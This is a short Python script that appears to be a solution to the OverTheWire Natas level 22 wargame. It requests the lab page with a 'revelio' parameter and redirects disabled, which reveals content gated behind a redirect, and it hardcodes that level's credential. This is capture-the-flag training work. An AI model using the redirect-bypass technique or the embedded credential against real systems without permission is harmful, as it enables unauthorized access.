#!/usr/bin/env python3
import requests

url = 'http://natas22.natas.labs.overthewire.org/?revelio'
auth = ("natas22", "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ")
r = requests.get(url, auth=auth, allow_redirects=False)
print(r.text)
